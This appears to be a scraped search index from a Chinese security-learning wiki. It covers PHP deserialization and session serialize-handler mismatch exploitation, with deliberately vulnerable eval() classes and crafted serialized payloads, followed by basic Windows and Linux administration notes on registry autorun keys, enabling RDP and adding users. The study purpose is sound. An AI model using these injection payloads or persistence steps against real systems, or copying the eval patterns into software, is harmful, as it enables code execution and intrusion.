https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://www.freebuf.com/vuls/202819.html","tags":[null]},{"title":"php","path":"/wiki/WP/反序列化/php/index.html","content":"Deserialization + __call + SoapClient + CRLF = SSRF 点击阅读详细内容... 📝 文档 php反序列化 点击阅读详细内容... 📝 文档 _yii反序列化 点击阅读详细内容... 📝 文档 知识点 点击阅读详细内容... 📝 文档"},{"title":"靶场","path":"/wiki/Web知识点/SQL注入/靶场/index.html","content":""},{"title":"知识点","path":"/wiki/WP/反序列化/php/知识点.html","content":"魔术方法__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 常规漏洞__WAKEUP将在序列化之后立即被调用,当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。 __DESTRUCTPHP中SESSION反序列化（重点）简介与基础知识在php.ini中存在三项配置项： session.save_path= –设置session的存储路径 session.save_handler= –设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen –指定会话模块是否在请求开始时启动一个会话，默认为0不启动 session.serialize_handler string –定义用来序列化反序列化的处理器名字。默认使用php (php5.5.4) 以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。 在使用xampp组件安装中，上述的配置项的设置如下： session.save_path=D:\\xampp\\tmp 表明所有的session文件都是存储在xampptmp下 session.save_handler=files 表明session是以文件的方式来进行存储的 session.auto_start=0 表明默认不启动session session.serialize_handler=php 表明session的默认序列化引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 引擎 session存储方式 php(php5.5.4) 存储方式是，键名+竖线 php_serialize(php5.5.4) 存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化） php_binary 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 在PHP (php5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(session.serialize_handler, 需要设置的引擎名);进行设置。 示例代码如下： php ?phpini_set(session.serialize_handler, php_serialize); //设置序列化引擎使用php_serializesession_start();// do something...... 存储机制 **php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。**存储的文件是以sess_sessionid(PHPSESSID)来进行命名的，文件的内容就是session值经过serialize()函数序列化之后的内容。假设我们的环境是xampp，那么默认配置如上所述。 在默认配置情况下（在php引擎下：）： php ?phpsession_start() // session_start()会创建新会话或者重用现有会话$_SESSION[name] = spoock;var_dump();? 可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，所以在xampptmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是name|s:6:spoock; 。name是键值，s:6:spoock;是serialize(spoock)的结果（php引擎方式存储：键名+竖线 |+经过serialize()函数序列处理的值）。 在php_serialize引擎下： php ?phpini_set(session.serialize_handler, php_serialize); // 设置序列化引擎使用php_serializesession_start(); // 启动新会话或者重用现有会话 $_SESSION[name] = spoock; var_dump();? SESSION文件的内容是a:1:{s:4:name;s:6:spoock;} 。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key(键)和value(值)都会进行序列化。 在php_binary引擎下：存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php ?phpini_set(session.serialize_handler, php_binary);session_start();$_SESSION[name] = spoock;var_dump();? SESSION文件的内容是names:6:spoock; 。由于name的长度是4，4在ASCII表中对应的就是EOT（这个）。根据php_binary的存储规则，最后就是names:6:spoock; 。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧) SESSION序列化漏洞利用php ?phpclass syclover var $func=; function __construct() // __construct()在实例化是被调用 $this-func = phpinfo(); function __wakeup() eval($this-func); unserialize($_GET[a]);? 在11行对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问localhost/test.php?a=O:8:syclover:1:{s:4:func;s:14:echo spoock;;} 。那么反序列化得到的内容是： php object(syclover)[1] public func = string echo spoock; (length=14) **最后页面输出的就是spoock，说明最后执行了我们定义的echo “spoock”;方法。**这就是一个简单的序列化的漏洞的演示 PHP SESSION中的序列化危害PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。**如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。**通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如: php $_SESSION[spoock] = |O:11:PeopleClass:0:; 上述的$_SESSION的数据如果使用php_serialize，那么最后的存储的内容就是a:1:{s:6:spoock;s:24:|O:11:PeopleClass:0:{};} 。 但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是： php array (size=1) a:1:s:6:spoock;s:24: = object(__PHP_Incomplete_Class)[1] public __PHP_Incomplete_Class_Name = string PeopleClass (length=11) 这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将a:1:{s:6:“spoock”;s:24:”作为SESSION的key(键)，将O:11:“PeopleClass”:0:{}作为value(值)，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 实际利用存在s1.php和us2.php这两个文件，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞。 s1.php，使用php_serialize来处理session php ?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[spoock]=$_GET[a]; us2.php，使用php来处理session php ini_set(session.serialize_handler, php);`localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;`session_start();class lemon var $hi; function __construct() $this-hi = phpinfo();; function __destruct() eval($this-hi); // O:5:lemon:1:s:2:hi;s:14:echo spoock;; 此题在s1.php中有可以传入session的点，所以就不用构造表单了，这题的突破点在哪里，没错，就是我备注的那块s2.php中ini_set(session.serialize_handler, php);，选择session序列化处理器。 当访问s1.php时，提交如下的数据并存储到session文件中： php localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;1 此时传入的数据会按照php_serialize来进行序列化，由s2.php读取时按照php来反序列化。 O:5:“lemon”:1:{s:2:“hi”;s:14:“echo “spoock”;”;}由以下序列化来得到，在加上一个竖杠 |就行了 php ?phpclass lemon public $hi=xxxxx;$obj = new lemon();echo serialize($obj);?xxxxx处按照你想执行的代码来填写，这里填的是echo spoock 此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。","tags":[null]},{"title":"密码","path":"/wiki/Web知识点/常见密码&路径/密码/index.html","content":""},{"title":"网络安全","path":"/wiki/笔记/网络安全.html","content":"一，Windows系统1，重要文件介绍# Program Files 软件程序存放目录，64位程序文件默认会安装到这个目录下，安装的时候是可以自行修改安装目录的，如果你安装的某个软件的时候，没有特意的修改安装路径，那么就去这个目录中找# Program Files (x86) 32位程序文件默认会安装到这个目录下，x86是x86_32的简写，x64是x86_64的简写# Windows 系统程序的核心目录#用户 多用户文件(桌面)，现在的系统都支持多个用户登录操作，系统为了作区分，就在系统盘为每个用户分配一个默认的文件夹，这就是所谓的用户目录。 2.开机自启动设置# win + r 输入 shell:startup 回车，打开一个文件夹(里面都是开机自启动的程序的快捷方式) -----路径如下## C:\\Users\\艾尼-aini\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup## 把应用快捷方式拖到这个文件夹里即可 3，查看电脑IP 地址## 终端 ipconfig 4,windows共享资源## 共享资源：文件右击属性，共享，添加 everyone## 访问资源：\\\\192.168.1.5\\Tools ## 直接回车，就可以直接打开文件（如果设置过密码的话，需要用户名和密码登录) 5,window注册表## 打开 regedit 5.1 注册表是什么 Windows操作系统称之为登录档案。是Microsoft Windows中的一个重要的数据库，注册表是 windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着Windows的启动、硬件驱动程序的 装载以及一些Windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配 置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算 机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和 其他底层的系统状态信息，以及其他数据等。注册表中还包含 Windows 在运行期间不断引用的信息，例如， 每个用户的配置文件、计算机上安装的应用程序以及每个应用程序可以创建的文档类型、文件夹和应用程序图 标的属性表设置、系统上存在哪些硬件以及正在使用哪些端口。当一个用户准备运行一个应用程序，注册表提 供应用程序信息给操作系统，这样应用程序可以被找到，正确数据文件的位置被规定，其他设置也都可以被使 用。 正常情况下，你可以点击开始菜单当中的运行，然后输入regedit或regedit.exe点击确定就能打开 Windows操作系统自带的注册表编辑器了，友情慎重提醒，操作注册表有可能造成系统故障，若您是对 Windows注册表不熟悉、不了解或没有经验的Windows操作系统用户建议尽量不要随意操作注册表，即便是必 须要操作，那么也要提前做好注册表的备份工作。如果上述打开注册表的方法不能使用，说明你没有管理员权 限，或者注册表被锁定，如果是没有权限，那么想办法解锁权限。 简单来说：注册表是windows系统来记录和修改用户设置的，不论是软件还是硬件 5.2 注册表结构 注册表由项（也叫主键或称“键”）、子项（子键）和值构成。一个项就是分支中的一个文件夹，而子项就 是这个文件夹当中的子文件夹，子项同样它也是一个项。一个值则是一个项的当前定义，由名称、数据类型以 及分配的值组成。一个项可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该 项的默认值。 在注册表编辑器（regedit.exe）中，数据结构显示如下，其中，command键是open项的子项，(默 认)表示该值是默认值，值名称为空，其数据类型为REG_SZ，数据值 为%systemroot%/system32/notepad.exe%1数据类型。 注册表的数据类型主要有以下四种：显示类型（在编辑器中）数据类型说明 ## REG_SZ：字符串：文本字符串 ## REG_MULTI_SZ：多字符串值：含有多个文本值的字符串 ## REG_BINARY：二进制数：二进制值，以十六进制显示， ## REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值。 5.3 远程桌面注册表位置## 位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server## 双击 fDenyTSConnections 1----- 0 ## 1 -------- 表示关闭 0 -----------表示开启 5.4 注册表控制开启自启动## HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run## 找到对应的自启动程序删除就可以## 我们发现其实还有一些开启自启动的程序在注册表的上面这个位置看不到，那么可以能在其他位置## 如 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ，如下## 对于win10来讲的常见位置： ## HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ## HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run ## 其他位置：这些大致了解即可，后面用到哪个就说哪个。 ## Load注册键： ## HKEY_CURRENT_USER＼Software＼Microsoft＼WindowsNT＼CurrentVersion＼Windows＼load ## Userinit注册键： ## HKEY_LOCAL_MACHINE＼SOFTWARE＼Microsoft＼WindowsNT＼CurrentVersion＼Winlogon＼Userinit ##这里也能够使系统启动时自动初始化程序。通常该注册键下面有一个userinit.exe，但这个键允许指定用逗号分隔的多个程序，例如“userinit.exe,OSA.exe”(不含引号)。 5.5 命令行添加注册表选项## reg add HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings /v dms /t REG_SZ /d test /f## 注：reg 命令;add 增加; /v 选项; /t 类型 ;/d 值;/f 不用提示就强行覆盖现有注册表项 6，window安全组策略6.1 定义 百度百科：组策略（英语：Group Policy）是微软Windows NT家族操作系统的一个特性，它可以控制用户 帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配 置。组策略的其中一个版本名为本地组策略（缩写“LGPO”或“LocalGPO”），这可以在独立且非域的计算机上 管理组策略对象。 通俗解释：组策略是一组策略的集合，策略就是制定的规则。组策略是将系统重要的配置功能汇集成各种配置 模块，供用户直接使用，从而达到方便管理计算机的目的。简单点说，组策略就是修改注册表中的配置。当 然，组策略使用自己更完善的管理组织方法，可以对各种对象中的设置进行统一的管理和配置，远比手工修改 注册表方便、灵活，功能也更加强大## 这里我用win10专业版系统来演示，家庭版是不能操作这个功能的。## 组策略分本地组策略和远程组策略，远程组策略我们学到域渗透的时候再讲解，先看本地组策略。 6.2 打开组策略## 方式1：直接搜索 ## 方式2：win+r键，运行 gpedit.msc ，即可打开 6.3 组策略两大模块## 计算机配置：针对于本地计算机生效## 用户配置：针对于用户生效 6.4 组策略禁用软件对应注册表位置## 前面定义的位置有提到过，组策略就是修改注册表中的配置。## 首先把注册表打开，刚才禁用来着，别忘了取消一下，那么刚才我们演示的示例是对应修改的注册表什么位置呢？在这里## HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun 6.5 组策略的实例## 限制某些软件运行## 限制插U盘 7，windows服务7.1 常见服务## DHCP Client服务 ## 这个服务程序如果没有开启，那么我们的电脑无法得到ip地址，就无法联网 ## Print Spooler服务 ##没有这个服务程序，我们就没有办法打印东西。 ## VMware Tools服务 ## 这是我们安装VMware tools工具软件的时候，Vmware自动在系统中添加的服务程序，就是为了一开机，我们的虚拟机就能和物理主机 进行数据交互等功能。 ## Windows Update服务 ## 为什么我们的电脑能够自动检测到需要更新了，就是这个服务程序一直在后台默默的运行着，检测并提示系统更新。 7.2 添加服务## sc create jaden_typora binpath=C:\\tools\\typora\\Typora\\Typora.exe ## sc是windows用来创建服务的关键指令 ## create表示创建的意思，固定搭配 ## jaden_typora是自己指定的服务名称(只要和系统中已经有的服务名称没有冲突即可) ## binpath=程序路径 7-3 删除服务## sc delete 服务名称 ## 例如： sc delete jaden_typora 8，用户和组 用户：用户是登录系统的身份凭证 用户组：一个系统可以有多个用户，为了方便管理这些用户，给多个用户统一分配操作权限等设置，可以将多 个用户划分为一个组，给这个组做一些配置，那么在这个用户组中的用户都会按照组的配置来设定自己的操 作。一个用户可以属于多个组，会同时继承多个组的操作权限。并且用户的权限其实还可以单独设定，甚至超 过所属组的权限。 8.1 常见的用户组说明需要人为添加成员的组 Administrators：管理员组，属于该administators本地组内的用户，都具备系统管理员的权限，它们拥有对这台计算机最大的控制权限，可以执行整台计算机的管理任务。内置的系统管理员账号Administrator就是本地组的成员，而且无法将它从该组删除，它的操作权限比Administrators组中的其他成员还要高。 Users：普通用户组，该组员只拥有一些基本的权利，例如运行应用程序，但是他们不能修改操作系统的设置、不能更改其它用户的数据、不能关闭服务器级的计算机。 Guests：来宾组，该组是提供没有用户帐户，但是需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。该组最常见的默认成员为用户帐号Guest。默认这个组是禁用状态，操作权限最低。 动态包含成员的组：也就是它里面的成员是不固定的，随着用户的操作，组成员会动态变化，也可以手动添加。 INTERACTIVE：默认包含本地登录的账户 Authenticated Users：包含了通过验证的用户，不包含来宾用户 Everyone：所有账户都属于这个组(设置全面开放权限时使用)，注意，如果Guest帐号被启用时，则给Everyone这个组指派权限时必须小心，因为当一个没有帐户的用户连接计算机时，他被允许自动利用Guest帐户连接，但是因为Guest也是属于Everyone组，所以他将具备Everyone所拥有的权限。 9,window常见指令9.1 常见指令## 面板操作： exit -- 退出cmd面板 cls -- 清除cmd面板上的历史记录 ## 文件和目录操作： ## 指令 /?，可以查看指令的具体参数和对应能力，比如，查看cd指令怎么用，输入：cd /? ## c: -- 切换盘符 ## cd指令 -- 切换路径，cd 路径，cd ..返回上一层目录，cd ../.. 返回上一层的上一层目录 ## dir指令 -- 显示当前目录信息，目录下面的文件和文件夹列表 ## md 文件夹名 -- 创建新文件夹 ## type nul 文件名 -- 创建一个空文件，比如type nul jaden.txt ## del /s 文件名 -- 删除文件 ## rd /s 文件夹名 -- 删除文件夹## 用户操作相关指令： ## net user #查看用户列表 ## net user 用户名 密码 #改密码 ## net user 用户名 密码 /add #创建一个新用户 ## net user 用户名 /del #删除一个用户 ## net user 用户名 /active:yes/no #激活或禁用账户 ## 用户组操作相关指令： ## net localgroup #查看组列表 ## net localgroup 组名 #查看该组的成员 ## net localgroup 组名 /add #创建一个新的组 ## net localgroup 组名 用户名 /add #添加用户到组 ## net localgroup 组名 用户名 /del #从组中踢出用户 ## net localgroup 组名 /del #删除组 9.2 激活Administrator用户## 执行指令 net user administrator /active:yes## 切换administrator来登录，默认是没有密码的 二，Linux系统2.1 window远程连接Linux系统## 语法：ssh 用户名@ip地址## 比如：ssh root@192.168.61.131 2.2 简单指令总结# 远程登录linux系统 ssh root@192.168.202.136# 断开连接 exit# 重启系统 reboot 或者 shutdown -h now# 关机指令 shutdown #默认30秒之后才会关机# 立即关机 shutdown -h now# 十分钟之后关机长度 shutdown -h 10 2.3 文件和目录操作2.3.1 新建文件#新建文件 touch 例子1： touch 1.txt #创建单个文件 例子2： touch test1..10.txt #批量创建文件touch testa..f.txt 例子3： touch /root/4.txt #在指定的/root目录下，创建文件4.txt # 如果touch的文件名称重复了，不会覆盖原文件 2.3.2 查看目录下的文件# ls全称list 参数 -a # 显示隐藏文件 -l # 竖向列表，详细信息展示 -h # 以易于阅读的形式显示 与 l 命令一起用 -1 # 属性只显示文件夹（竖着显示） ## ls：显示当前目录下的内容 例子1：ls test09.txt #查看test09.txt是否存在，有会显示文件名称，没有会报错 例子2：ls *.txt #查看以txt结尾的所有文件，类似于windows下的*.后缀名搜索 例子3：ls -1 #以一行一个文件的方式显示，注意这是-1，是数字1，不是l昂 例子4：ls -a al #查看所有文件，包括隐藏文件，touch .文件名，.开头的就是隐藏文件 例子5：ls -a -1 #查看所有文件，以一行一个来显示 例子6：ls -l #类似于windows的详细列表，这个-l不是数字1 ## 以.开头的文件是隐藏文件，默认不显示 2.3.3 移动、也可以进行重命名## mv全称move ,如果目标不存在，则有改名的效果 例子1：mv 222.txt 123.txt #将222.txt文件重命名为123.txt 例子2：mv 123.txt /opt #将当前目录下的123.txt移动到/opt目录下 2.3.4 复制## cp全称copy，复制有个特点，就是如果复制到的文件夹中有同名的文件，会帮我们改名字并加上副本两个字， ## 参数 -r ## 复制文件夹## linux不会帮我们改名字，我们需要自己指定名字，后缀名尽量不要改。例子1：cp test01.txt /opt/ #将当前目录下的test01.txt复制到/opt目录下例子2：cp -a dev04 /opt/ #将目录dev04复制到/opt下，注意，要在dev04的上一级目录来复制它，在它内部是不能复制这个文件夹的cp -r aini /root/norah/ 2.3.5 删除#删除，注意Linux和windows不同，没有回收站，删了就是删了## 参数 -f -r -f ## 强制删除 -r ## 删除文件夹 例子1: rm /opt/123.txt #将/opt目录下的123.txt文件删除，需要回复y确认删除 例子2： rm -f /opt/test01.txt #将/opt目录下的test01.txt文件删除，不需要回复，强制删除，很多指令都有自己的参数，而且有好多，-f就是强制的意思。 例子3： rm 文件1 文件2 文件3 #删除多个文件#删除一个目录，linux的参数大部分没有先后顺序#直接删除文件夹，比如 rm dev，这是不行的，会报错，需要带上r参数[root@localhost ~]# rm -f -r dev02 [root@localhost ~]# rm -r -f dev03[root@localhost ~]# rm -fr dev # rm的两个参数可以合并到一起[root@localhost ~]# rm -rf dev01 2.3.6 创建文件夹##创建目录directory，这里说的目录就是文件夹，默认显示是蓝色的字体，文件显示是白色的字体## mkdir 全称make directory 例子1：mkdir dev #创建一个dev目录 例子2：mkdir dev01..10 #批量创建多个目录 例子3：mkdir -p 1/2/3/4/5/6 #一次性创建多级子目录 ## 重命名：mv jaden wulaoban # 将jaden目录改名为wulaoban 2.3.7 切换目录cd #全称change directory 例子1： cd local #切换到local目录中 cd /usr/local #切换到目录/usr/local cd .. #切换到上一级目录 cd ../.. # 进入上一级的上一级目录 ，还可以继续../ cd / # 直接切换到根目录 2.3.8 显示当前工作目录#print work directorypwd#打印当前工作目录 2.3.9 历史指令查询## history 2.3.10 目录分隔符## windows：C:\\Users\\ls198\\Desktop # 微软故意用\\，其他的unix分支系统都是/来分割## linux：/root/jaden/xx## linux只有一个盘符，不像windows，可以设置c盘、d盘...## /是根目录## /root 根目录下面的root目录## /root/jaden## /root/jaden/xx 2.3.11 修改文件内容#修改文件内容，先体验一下，后面再专门讲vi的功能#vi编辑器，和windows的记事本工具类似 例子1： vi test03.txt #编辑文件test03.txt # vi编辑保存文件，需要三种模式切换 ## 常规模式：默认是常规模式，在常规模式中可以使用各种快捷键，帮我们快速编辑文件，比如dd，就是删除当前一行数据 ## 编辑模式：切换英文输入法，然后按ioa三个键中的任意一个键都可以进入编辑模式，这样才能向文件中写内容，写完内容之后，先回 到常规模式，在编辑模式中按esc回到常规模式 ## 命令模式：在常规模式时按:(英文的冒号)进入命令模式，命令模式按esc回到常规模式，命令模式下输入q然后回车表示退出文件，wq 保存并退出，q!表示强制退出不保存 11-1 常规模式快捷键 11-2 命令模式快捷键 2.3.12 查看文件内容#从上往下顺序查看文本内容 cat 例子1：cat test03.txt #查看test03.txt的全部内容#从下往上倒着查看文本内容 tac 例子1：tac test03.txt #倒着查看test03.txt的全部内容## 翻页查看 more ## 查看过程中通过空格翻页 ## 通过q退出 2.3.13 查看文件头几行#head 例子1： head test03.txt #查看文件的前十行，默认 例子2： head -n 5 test03.txt #查看文件的前5行 例子3： head -5 test03.txt #查看文件的前5行 2.3.14 查看文件倒数几行#tail 例子1： tail test03.txt #查看文件的倒数十行，默认 例子2： tail -n 5 test03.txt #查看文件的倒数5行 例子3： tail -5 test03.txt #查看文件的倒数5行 2.4 管道管道符号： | ，可以将前面指令的执行结果，作为后面指令的操作内容。 ## 比如过滤ip地址ip addr | tail -4 | head -1 2.5 文件内容过滤2.5.1 统计#统计，比如统计文件有多少个字节、多少行等等 wc # 全称Word Count，计数 ## 参数 -l # 按行统计，不会单独使用，需要接在管道后面 -c # 统计字节个数 -m # 统计字符数量 -w # 统计单词数量 wc aini.txt # 2 11 59 分别是 行数 单词数量 字节数 例子1： [root@localhost ~]# cat jaden.txt |wc -l 18 # 共18行 [root@localhost ~]# cat -n jaden.txt # 显示内容的同时，显示行号 1 sdsdsdsdsdsdsd是的是的 2 3 sdsd 4 65656 5 sdsd 6 sdsd 7 sdsd 8 33333 9 565656565 10 33333 11 565656565 12 33333 13 565656565 14 33333 15 565656565 16 17 18 sdssds ;;;; wc -c jaden.txt # 统计文件中有多少个字节# 统计指令执行结果有多少行 例子：ip addr|wc -l# 统计bin目录下有多少个命令文件 例子：ls /bin |wc -l 2.5.2 生成数字序列seq # 全称：sequence，序列的意思# 例子1：产生一个5到12的序列[root@localhost ~]# seq 5 12 5 6 7 8 9 10 11 12例子2：产生一个5到12等宽的序列[root@localhost ~]# seq -w 5 110 05 06 07 08 09 10 11 12 2.5.3 过滤字符串#按行过滤字符串，默认是模糊匹配，只要单词中含有某些内容就过滤出单词所在的每行数据grep## 参数 -n 表示在结果中显示匹配的行的行号例子1： #普通过滤，将含有3这个字符的行过滤出来[root@localhost ~]# grep 333 jaden.txt 33333 33334 33333 53333例子2： #显示行号[root@localhost ~]# grep -n 333 jaden.txt 8:33333 10:33333 12:33333 14:33333 2.5.4 按列过滤awk #awk其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母。# 例子1： 取列,$1代表第一列，$2代表第二列，$NF代表最后一列，列是由空格分开的[root@localhost ~]# cat jaden.txt row 1, cell 1 row 1, cell 2row 2, cell 1 row 2, cell 2[root@localhost ~]# awk print $1 jaden.txt # 注意，必须是单引号 row row[root@localhost ~]# awk print $2 jaden.txt 1, 2, #例子2：以逗号,做分隔符[root@localhost ~]# cat jaden.txt row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2[root@localhost ~]# awk -F , print $1 jaden.txt row 1 row 2[root@localhost ~]# awk -F , print $NF jaden.txt cell 2 2.5.5 排序sort # 默认排序，先数字后字母# sort -n # 先字母(先小写字母后大写字母)后数字的排序方式，# sort -n -r 反向排序例子1：[root@localhost ~]# cat test02.txt 3 2 6 4 8 7 5 3 2 1 2 3 4 5 6 9 1 5 7[root@localhost ~]# cat test02.txt|sort -n 1 1 2 2 2 3 3 3 4 4 5 5 5 6 6 7 7 8 9 2.5.6 统计去重uniq #全称：unique，唯一、去重的意思，但是它是将连续的去重，不会间隔去重，所以最好先排序再去重例子1：[root@localhost ~]# cat test02.txt|sort -n 1 1 2 2 2 3 3 3 4 4 5 5 5 6 6 7 7 8 9[root@localhost ~]# cat test02.txt|sort -n|uniq [root@localhost ~]# cat test02.txt|sort -n|uniq -c # -c显示重复次数 2 1 3 2 3 3 2 4 3 5 2 6 2 7 1 8 1 9 2.6 Linux目录结构介绍/bin #存放二进制的可执行文件，也就是命令，其实每个命令基本都是一个可执行代码文件，特别重要，不能删除! # window的命令文件都是exe结尾的，linux的命令文件是没有后缀名的，如果删除了某个命令文件，那么这个命令就不能用了 /boot #开机启动需要的文件， 特别重要，不要动里面的文件。/dev #dev全称：Devices，硬件设备控制文件，特别重要，千万不要动!/etc #存放系统的各种配置文件，相当于windows的注册表，也就是超大的配置文件，特别重要，不能删除! # 比如改密码什么的，其实都是修改的etc下面的某个配置文件(shadow文件)中的配置，还有安装的各种软件配置文件，一般也是放到这个目录，也可以放到其他目录，但是一般都是放到这里。 /home #所有普通用户的家目录就在这个home目录下，每个用户目录中都有自己的桌面等目录，windows都是放到了Users目录下/root #root用户的专属家目录，特别重要，不能删除!/lib #library 32位库，一般是so结尾的库文件，特别重要，不能删除! # so结尾的库文件，类似于windows下的系统的dll动态链接库文件。千万不要尝试删除，试试就逝世。如果有快照的话你可以试试。 /lib64 #library 64位库，一般是so结尾的库文件，特别重要，不能删除!/media #多媒体文件目录(音乐、视频、文档等)，是一个不重要的目录，只是linux的作者希望用户能够按照对应目录来存放内容，这个目录普通用户是没有权限删除的，root用户可以删除它/mnt #全称：mount，挂载的意思，一般是用来挂载光盘，U盘，也就是插入U盘、关盘等，打开之后一般都是在这个mnt目录下，这个目录也是可以删除的/opt #部分软件安装存储目录，安装的某些软件的时候，如果默认安装，那么它可能会将自己的程序安装到这个目录下，如果你不用这个目录，那么也是可以删除的目录/proc #全称：process，是进程的意思，每个进程编号一个目录。通过ps -ef指令可以查看到进程编号， 特别重要，不能删除!/sbin #全称：super bin，是超级用户才能使用的命令 ，特别重要，不能删除! shutdown reboot # 比如普通用户是没有关机(shutdown)、重启(reboot)等危害比较大的指令，这些命令文件在sbin目录中 /srv #之前用来存放软件源代码文件的，这个目录也没啥用。源代码--编译--打包--软件包，软件包在windows下叫做可执行文件，linux下叫做命令文件。其实叫啥都行，明白它是啥即可。/sys #全称：system，是系统功能目录，特别重要，不能删除!/tmp #全称：temporary，临时的意思，用来存放临时文件的目录，这里面的文件如果长时间没用的话，会被系统自动清除。 # windows下也有很多这样的临时目录，多数都是隐藏目录，比如C:\\Users\\用户名\\AppData\\Local\\Temp，好多清理系统垃圾的软件，其实都是删除了一些临时文件。 /run #运行，程序运行的时候产生的文件，多数也是临时文件，但是这里的文件不会被系统自动清除。/usr #用户级的目录，usr全称是UNIX software resource，主要存放的是一些软件程序以及这些程序所需要使用的库，当然也会保存一些程序需要的资源文件，特别重要，不能删除! usr目录下面的文件夹种类和/根目录下很像，比如都有bin目录，linux作者这样的设计是想告诉用户，系统的命令文件放到根目录的bin下，用户自己安装的某些软件的命令文件，放到/usr/bin下面。/var #全称是variable，用来存放一些经常变动的文件，比如日志文件、网页文件、缓存等，特别重要，不能删除! # 这个目录下我们安全人员一般只关注log日志目录。比如用户登录系统、什么时候登录的、登陆了几次等等，都会在log目录下产生日志记录，这个我们后期会做演示. 2.7 用户与用户组管理2.7.1 用户管理1-1 创建用户#创建用户useradd #创建一个用户例子1：useradd test1 1-2 设置密码#设置密码，远程ssh连接是需要密码的，所以想让某个用户登录系统，必须设置密码passwd例子1：passwd test1#用root用户给普通用户修改密码[root@localhost ~]# passwd test1更改用户 test1 的密码 。新的 密码：123456无效的密码： 密码是一个回文重新输入新的 密码：123456passwd：所有的身份验证令牌已经成功更新。#普通用户自己修改密码[test1@localhost ~]$ passwd # 给当前登录用户修改密码，root用户修改密码不需要输入旧密码，普通用户需要输入旧密码更改用户 test1 的密码 。为 test1 更改 STRESS 密码。（当前）UNIX 密码：新的 密码：无效的密码： 密码少于 8 个字符新的 密码：无效的密码： 密码少于 8 个字符新的 密码：无效的密码： 密码未通过字典检查 - 过于简单化/系统化passwd: 已经超出服务重试的最多次数# 一般linux的密码是有复杂度要求的，比如下面这种密码就可以通过：大小写组合、数字、特殊字符组合起来超过8位。jaden666@qq.COMjaden666@WSX例子3：#免交互修改密码，这样不需要输入两次密码确认。echo是打印的意思，有结果输出给passwd命令来修改test1用户的密码echo 123456|passwd --stdin test1# 这种一般同时改多个Linux服务器系统的密码时比较方便。 1-3 检查用户是否存在#检查用户是否存在id例子1: #用户存在，系统的返回结果[root@localhost ~]# id test1uid=1000(test1) gid=1000(test1) 组=1000(test1)#用户不存在，系统的返回结果[root@localhost ~]# id test2id: test2: no such user 1-4 删除用户## 查看用户列表cat /etc/passwd#删除用户userdel例子1：#被删除的用户还在登录状态，是不能删除的[root@localhost ~]# userdel test1userdel: user test1 is currently used by process 2356#被删除的用户，退出登录之后，可以正常删除[root@localhost ~]# userdel test1 